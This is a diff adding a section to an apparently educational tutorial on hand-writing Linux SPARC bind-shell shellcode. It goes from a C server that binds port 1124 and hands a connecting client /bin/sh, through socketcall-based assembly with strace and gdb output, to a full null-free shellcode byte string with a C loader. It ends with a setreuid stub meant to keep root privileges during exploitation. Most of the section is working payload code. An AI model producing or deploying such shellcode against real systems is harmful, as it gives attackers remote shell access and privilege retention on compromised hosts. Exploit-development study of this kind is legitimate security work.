@@ -644,3 +644,445 @@ Here we have it. At this point, we ask ourselves how to remove it. We could perf
 ```
 
 We finally succeeded: we have a valid shellcode working for Linux SPARC (and that *would* work on Solaris if we replace the trap code by 0x8) and without NULLs. But as normally is emphasized in lots of similar documents, a shellcode as the above will only work in situations where the escalation of privileges is executed locally, via physical access to the server or using a pre-existing network connection (like SSH).
+
+### 6.2. Bind-Shellcode
+
+Creating a shellcode that listens on a port and answers with a shell is not as easy as it could seem if we are going to avoid NULLs and not exceed 250 bytes in size, but is something we can achieve.
+
+We will start from the classic remote C micro-shell that redirects the file descriptors to /bin/sh:
+
+```
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <netinet/in.h>
+    #include <sys/types.h>
+
+    int main() {
+      struct sockaddr_in sa;
+      char *shell[2];
+      int sockfd_l, sockfd_a, len;
+      if ((sockfd_l = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
+        perror ("error: socket() ->");
+        exit (1);
+      }
+      sa.sin_family = AF_INET;
+      sa.sin_port = htons(1124);
+      sa.sin_addr.s_addr = INADDR_ANY;
+      memset(sa.sin_zero, '\0', sizeof sa.sin_zero);
+
+      len = sizeof(sa);
+
+      if (bind (sockfd_l, (struct sockaddr *) &sa, len) == -1) {
+        perror("error: bind()");
+        exit (1);
+      }
+      if (listen (sockfd_l, 1)) {
+        perror ("error: listen()");
+        exit (1);
+      }
+
+      if ((sockfd_a = accept(sockfd_l, (struct sockaddr *)&sa, &len)) == -1) {
+        perror ("error: accept()");
+        exit (1);
+      }
+
+      if ((dup2 (sockfd_a, 0)) == -1) {
+        perror ("error: dup2(0)");
+        exit (1);
+      }
+
+      if ((dup2 (sockfd_a, 1)) == -1) {
+        perror ("error: dup2(1)");
+        exit (1);
+      }
+
+      if ((dup2 (sockfd_a, 2)) == -1) {
+        perror ("error: dup2(2)");
+        exit (1);
+      }
+
+      shell[0] = "/bin/sh";
+      shell[1] = NULL;
+      execve (shell[0], shell, NULL);
+
+      return (0);
+    }
+```
+
+Virtual terminal 1 (vt1):
+```
+    % gcc server.c -o server && ./server
+```
+
+vt2:
+
+```
+    % echo 'id' | nc localhost 1124
+    uid=1000(jbarrio) gid=100(users) groups=10(wheel),100(users)
+    %
+```
+
+As we can see, it works, but when it comes to translate this into assembler, there are a few items that we need to address:
+
+- We need to guess the syscall values that we are going to need.
+- We need to get the valus of AF_INET, PF_INET, INADDR_ANY, etc.
+- We need to avoid using #include in our code, so we need to analyze the struct ``sockaddr_in`` to find the right sizes.
+
+Finding the syscall identifiers is easy: we check the file ``/usr/include/asm-sparc64/unistd.h`` and we get the value of sys_exit: (1) and... just this one, because if we search for the rest of values (socket, bind, listen and accept) we find out that there are no such syscalls neither for ``bind()`` neither for ``listen()``. This is normal and is the reason why a shellcode for Solaris will not work in Linux and vice versa: in Solaris there are syscalls for each and every network function.
+
+So as we just saw, we have two issues: we don't have enough syscalls neither bind() nor listen(), so we need to do it other way: via ``socketcall()``, which is the entry point for internetworking syscalls. In fact, if we compile this small 'server' with ``-ggdb`` and we add a breakpoint in the calls to ``bind()`` or ``listen()`` we can check how the system performs these actions:
+
+```
+    Breakpoint 1, 0xf7ebf9fc in bind () from /lib/libc.so.6
+    (gdb) disas
+    Dump of assembler code for function bind:
+    0xf7ebf9fc <bind+0>:    st  %o0, [ %sp + 0x44 ]
+    0xf7ebfa00 <bind+4>:    st  %o1, [ %sp + 0x48 ]
+    0xf7ebfa04 <bind+8>:    st  %o2, [ %sp + 0x4c ]
+    0xf7ebfa08 <bind+12>:   mov  2, %o0
+    0xf7ebfa0c <bind+16>:   add  %sp, 0x44, %o1
+    0xf7ebfa10 <bind+20>:   mov  0xce, %g1
+    0xf7ebfa14 <bind+24>:   ta  0x10
+```
+```
+    Breakpoint 2, 0xf7ebfb64 in listen () from /lib/libc.so.6
+    (gdb) disas
+    Dump of assembler code for function listen:
+    0xf7ebfb64 <listen+0>:  st  %o0, [ %sp + 0x44 ]
+    0xf7ebfb68 <listen+4>:  st  %o1, [ %sp + 0x48 ]
+    0xf7ebfb6c <listen+8>:  mov  4, %o0
+    0xf7ebfb70 <listen+12>: add  %sp, 0x44, %o1
+    0xf7ebfb74 <listen+16>: mov  0xce, %g1
+    0xf7ebfb78 <listen+20>: ta  0x10
+```
+```
+    % grep `echo $((0xce))` /usr/include/asm-sparc64/unistd.h
+    #define __NR_socketcall         206 /* Linux Specific */
+    %
+```
+
+There we have it. The same applies for the rest of syscallswe need, so we will use socketcall for all cases the same way we will do it in the IA-32 architecture: using a register for the syscall value and another one as a pointer to the arguments.
+
+As a side note, we can observe that ``htons()``, as mentioned earlier, in Linux sparc64 does not have any complexity:
+
+```
+    /usr/include/netinet/in.h:#
+      if __BYTE_ORDER == __BIG_ENDIAN
+      ...
+      # define htons(x)   (x)
+```
+
+OK, so we already solved the first issue: the syscalls. Let's fix now the second: the necessary macros: PF_INET, SOCK_STREAM, AF_INET e INADDR_ANY:
+
+```
+    bits/socket.h
+      #define PF_INET 2/* IP protocol family.  */
+      #define SOCK_STREAM = 1,/* Sequenced, reliable, connection-based
+      #define AF_INET PF_INET
+```
+```
+    /usr/include/netinet/in.h:
+      #define       INADDR_ANY ((in_addr_t) 0x00000000)
+```
+
+And the last point: disassemble the ``struct sockaddr_in``, which can be found in netinet/in.h:
+
+```
+    struct sockaddr_in
+    {
+      __SOCKADDR_COMMON (sin_);
+      in_port_t sin_port;>>->-/* Port number.  */
+      struct in_addr sin_addr;>->-/* Internet address.  */
+
+      /* Pad to size of `struct sockaddr'.  */
+      unsigned char sin_zero[sizeof (struct sockaddr) -
+        __SOCKADDR_COMMON_SIZE -
+        sizeof (in_port_t) -
+        sizeof (struct in_addr)];
+    };
+
+    /* Internet address.  */
+    typedef uint32_t in_addr_t;
+    struct in_addr
+    {
+      in_addr_t s_addr;
+    };
+```
+
+So we have so far:
+
+```
+    _SOCKADDR_COMMON: typedef unsigned short int sa_family_t;
+    sin_port: typedef uint16_t in_port_t;
+    sin_addr: typedef uint32_t in_addr_t;
+    sin_zero: sockaddr - #define __SOCKADDR_COMMON_SIZE>-(sizeof (unsigned \
+    short int)) - uint16_t - uint32_t
+```
+
+That means, sin_zero = 16 - 2 - 2 - 4.
+
+We already have all the necessary stuff to build the bind shellcode in assembler, but before we do that, let's have a look at how the stack is organized in SPARC:
+
+### 6.2.1.- SPARC Stack
+
+When the kernel loads a program into memory, it does it quite close to 0x20000000, so the next instructions occupy higher memory addresses. The kernel also manages to create a bit of space for the registers and automated variables in what is called the stack, which structure is of FILO type and is not much different from the one found in other architectures.
+
+As it has been explained in lots of documents, the stack grows to the bottom, so if a program needs more space, it will substract the necessary amount of bytes (aligned to 8) from the ``%sp`` register.
+
+The reserved memory space needs to be 64 bytes to be able to store the current register window, but normally the reserved size is 96 to store a struct pointer from which make a return (if necessary) and -as a convention-, space for the first 6 arguments even if none were passed. So this makes 64 + 4 + 24 = 92, which, aligned to 8, makes a total of 96. If the reader is wondering why GCC 4.1 used to allocate 104... check the algorithm implemented and the values returned by the subroutines. In the end, ``main()`` is just *another* subroutine. So, *graphically* speaking, we would have this:
+
+```
+                lowest memory addresses (0x0000000)
+
+               --------------------------- <-- %sp
+               |                         |
+               |    Register window      |
+               |                         |
+               --------------------------- <-- %sp + 64
+               |  Pointer to return      |
+               |        value            |
+               --------------------------- <-- %sp + 68
+               |   First 6 arguments     |
+               |                         |
+               --------------------------- <-- %sp + 92
+                   {  dynamic space  }
+               --------------------------- <-- %fp
+               |    local variables      |
+               --------------------------- <-- %fp - 4
+
+                  higher memory addresses
+```
+
+So if we need to address a variable to load it from or to a register, how do we do that? Which the instruction *family* load and store (truth is we only need the ``ld``, ``st`` and ``sth`` instructions, the latter for reasons we will see below). This family of instructions work with two operands, being the second the destiny of the instruction and the first a pointer (between carets):
+
+```
+    ld [ %fp + - 16 ], %l0  <-- loads the address of the fourth variable in %l0
+```
+
+So keeping this stack schema in mind, let's go back to the core of our goal: translate into assembler the above code written in C. We will, of course, start from the beginning, that is, the call to ``socket()``:
+
+```
+    .align 4                  ! we align the code
+    .global _start
+
+    _start:
+
+      save %sp, -136, %sp     ! reserve space in stack
+
+      mov 0x2, %o0            ! AF_INET
+      mov 0x1, %o1            ! SOCK_STREAM
+      mov 0x0, %o2            ! protocol
+      st %o0, [ %sp + 0x44 ]
+      st %o1, [ %sp + 0x48 ]
+      st %o2, [ %sp + 0x4c ]  ! we prepared the arguments in the stack
+      mov 0x1, %o0            ! value from socket() for socketcall()
+      add %sp, 0x44, %o1      ! we indicate in o1 the address of arguments
+      mov 0xce, %g1           ! 0xce = 206 = socketcall
+      ta 0x10                 ! equivalent of int 0x80, trap to the syscall
+```
+
+If we run an strace on this code, we will see that, yes, it already works:
+
+    % strace ./_socket
+    execve("./_socket", ["./_socket"], [/* 31 vars */]) = 0
+    socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+    --- SIGILL (Illegal instruction) @ 0 (0) ---
+    +++ killed by SIGILL +++
+
+``SIGILL`` was sent because we did not add a ``sys_exit(1)`` to the end of the code. If the reader tests thise code with a call to ``exit()`` after the trap to ``socketcall()``, will be able to see how this signal is not sent. Additionally, we can ask ourselves why we use 0x44 as the initial address for our arguments in the stack:
+
+```
+    % echo $((0x44))
+    68
+    %
+```
+
+Yes, 68 is the first free byte *after* storing the register window and the pointer to struct return.
+
+We already have one part of our code. Let's go for the next one, ``bind()``:
+
+```
+    st %o0, [ %fp -4 ]      ! store socket
+    mov 0x2, %o0            ! we start creating sockaddr_in
+    sth %o0, [ %fp -24 ]    ! sin_family = 2 (AF_INET) in the stack
+    mov 0x464, %o0          ! sin_port = 1124 (remember, big-endian)
+    sth %o0, [ %fp -22 ]    ! we put sin_port in the stack
+    clr [ %fp -20 ]         ! we push sin_addr (INADDR_ANY) to the stack
+    ld [ %fp -4 ], %o0      ! we get back the socket
+    add %fp, -24, %o1       ! we prepare the beginning of the struct
+    mov 0x10, %o2           ! sizeof struct
+    st %o0, [ %sp + 0x44 ]  ! we point to socket
+    st %o1, [ %sp + 0x48 ]  ! we point address of sockaddr_in
+    st %o2, [ %sp + 0x4c ]  ! we add the size of struct (16)
+    mov 0x2, %o0            ! we tell socketcall() what we want to bind
+    add %sp, 0x44, %o1      ! unsigned long *args (sockaddr_in)
+    mov 0xce, %g1           ! 0xce = 206 = socketcall
+    ta 0x10                 ! we execute the trap
+```
+If we execute strace on this one, we will see that it works fine, so let's move into ``listen()``:
+
+```
+    ld [ %fp - 4 ], %o0     ! we get back the socket as a returned value
+    mov 0x1, %o1            ! backlog of 1, but we can increase this value
+    st %o0, [ %sp + 0x44 ]  ! socket
+    st %o1, [ %sp + 0x48 ]  ! backlog
+    mov 0x4, %o0            ! listen()
+    add %sp, 0x44, %o1      ! unsigned long *args (sockaddr_in)
+    mov 0xce, %g1           ! 0xce = 206 = socketcall
+    ta 0x10
+```
+
+And we will finish the networking syscalls with ``accept()``:
+
+```
+    ld [ %fp - 4 ], %o0     ! we get back the socket as a returned value
+    add %fp, -24, %o1       ! we get back sockaddr_in
+    add %fp, -4, %o2
+    st %o0, [ %sp + 0x44 ]  ! socket
+    st %o1, [ %sp + 0x48 ]  ! struct
+    st %o2, [ %sp + 0x4c ]  ! len
+    mov 0x5, %o0            ! accept()
+    add %sp, 0x44, %o1      ! unsigned long *args (sockaddr_in)
+    mov 0xce, %g1           ! 0xce = 206 = socketcall
+    ta 0x10                 ! trap
+```
+
+We 'map' all the descriptors using ``dup2()``:
+
+```
+    st %o0, [ %fp - 8 ]     ! new socket
+    ld [ %fp - 8], %o0      ! place it as argument
+    xor %o1, %o1, %o1       ! stdin
+    mov 0x5a, %g1           !
+    ta 0x10                 ! trap
+    ld [ %fp - 8], %o0      !
+    mov 0x1, %o1            ! stdout
+    mov 0x5a, %g1           !
+    ta 0x10                 ! trap
+    ld [ %fp - 8], %o0      !
+    mov 0x2, %o1            ! stderr
+    mov 0x5a, %g1           !
+    ta 0x10                 ! and... trap
+```
+
+And last but not least, the shell:
+
+```
+    sethi   %hi(0x2F62696E), %l0
+    or      %l0, %lo(0x2F62696E), %l0
+    sethi   %hi(0x2F736800), %l1
+    and     %sp, %sp, %o0
+    xor     %o1, %o1, %o1
+    mov     0xb, %g1
+    ta      0x10
+```
+
+We can save the exit() call because if everything goes as expected, the process will be replaced by the shell launched by ``execve()``. Let's compile and execute:
+
+```
+  vt1:
+
+    % ./sc1
+    socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+    bind(3, {sa_family=AF_INET, sin_port=htons(1124), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
+    listen(3, 1)                            = 0
+    accept(3,
+```
+```
+  vt2:
+
+    % echo id | nc localhost 1124
+    uid=1000(jbarrio) gid=100(users) groups=10(wheel),100(users)
+    ^C
+```
+
+It works!! Do we already have our bind shellcode for SPARC? Not yet, we need to fix the NULLs issue, because if we get the opcodes we will find some NULLs there:
+
+    (gdb) x/16bx _start
+    0x10074 <_start>:       0x9d    0xe3    0xbf    0x78    0x90    0x10    0x20   0x02
+    0x1007c <_start+8>:     0x92    0x10    0x20    0x01    0x94    0x10    0x20   0x00
+    (gdb)
+
+There we have... the fourth instruction there's the one and only NULL -we were lucky- that we can find. And which ones is the fourth instruction? It is the assignment for the ``socket()`` call:
+
+```
+        mov 0x0, %o2            ! protocol
+```
+
+Getting rid of this one is easy: we can use an ``xor`` or a ``sub``.
+
+So, fixed the null, let's see the code:
+
+```
+    char sc[] =
+    "\x9d\xe3\xbf\x78\x90\x10\x20\x02\x92\x10"
+    "\x20\x01\x94\x1a\x80\x0a\xd0\x23\xa0\x44"
+    "\xd2\x23\xa0\x48\xd4\x23\xa0\x4c\x90\x10"
+    "\x20\x01\x92\x03\xa0\x44\x82\x10\x20\xce"
+    "\x91\xd0\x20\x10\xd0\x27\xbf\xfc\x90\x10"
+    "\x20\x02\xd0\x37\xbf\xe8\x90\x10\x24\x64"
+    "\xd0\x37\xbf\xea\xc0\x27\xbf\xec\xd0\x07"
+    "\xbf\xfc\x92\x07\xbf\xe8\x94\x10\x20\x10"
+    "\xd0\x23\xa0\x44\xd2\x23\xa0\x48\xd4\x23"
+    "\xa0\x4c\x90\x10\x20\x02\x92\x03\xa0\x44"
+    "\x82\x10\x20\xce\x91\xd0\x20\x10\xd0\x07"
+    "\xbf\xfc\x92\x10\x20\x01\xd0\x23\xa0\x44"
+    "\xd2\x23\xa0\x48\x90\x10\x20\x04\x92\x03"
+    "\xa0\x44\x82\x10\x20\xce\x91\xd0\x20\x10"
+    "\xd0\x07\xbf\xfc\x92\x07\xbf\xe8\x94\x07"
+    "\xbf\xfc\xd0\x23\xa0\x44\xd2\x23\xa0\x48"
+    "\xd4\x23\xa0\x4c\x90\x10\x20\x05\x92\x03"
+    "\xa0\x44\x82\x10\x20\xce\x91\xd0\x20\x10"
+    "\xd0\x27\xbf\xf8\xd0\x07\xbf\xf8\x92\x1a"
+    "\x40\x09\x82\x10\x20\x5a\x91\xd0\x20\x10"
+    "\xd0\x07\xbf\xf8\x92\x10\x20\x01\x82\x10"
+    "\x20\x5a\x91\xd0\x20\x10\xd0\x07\xbf\xf8"
+    "\x92\x10\x20\x02\x82\x10\x20\x5a\x91\xd0"
+    "\x20\x10\x21\x0b\xd8\x9a\xa0\x14\x21\x6e"
+    "\x23\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x1a"
+    "\x40\x09\x82\x10\x20\x0b\x91\xd0\x20\x10";
+
+    int main()
+    {
+      int (*f)() = (int (*)()) sc;
+      printf("len = %d\n", sizeof(sc));
+      (int)(*f)();
+      exit(0);
+    }
+```
+
+However, even we already have a working portbind shellcode, there is an essential piece that we still need to fix since we first built our initial shellcode: avoid that our privileges are dropped or, at least, try to avoi that, so we need to call ``setreuid()`` before running ``execve()``:
+
+```
+      xor %o0, %o0, %o0
+      xor %o1, %o1, %o1
+      mov 0x7e %g1
+      ta 0x10
+```
+
+This would be the code we would use, but it generated a null in the first instruction which *seems* difficult to get rid of... unless we *avoid* using the %o0 register as an operand and we use it just as storage for the result of the operation:
+
+```
+    xor %o1, %o1, %o0
+    xor %o1, %o1, %o1
+    mov 0x7e, %g1
+    ta 0x10
+```
+
+We can check the opcodes as valid ones:
+
+```
+    0x92    0x1a    0x40    0x09    0x90    0x1a    0x40    0x09
+    0x82    0x10    0x20    0x7e    0x91    0xd0    0x20    0x10
+```
+
+**Now** we have everything we need. If we add these four instructions for the setreuid to the above shellcode just before the call to execve(), we will have a shellcode with this features:
+
+    + Portbind
+    + No nulls
+    + With setreuid (UID is up to the reader).
+
+The size is 277 bytes, so it's time to optimize it.
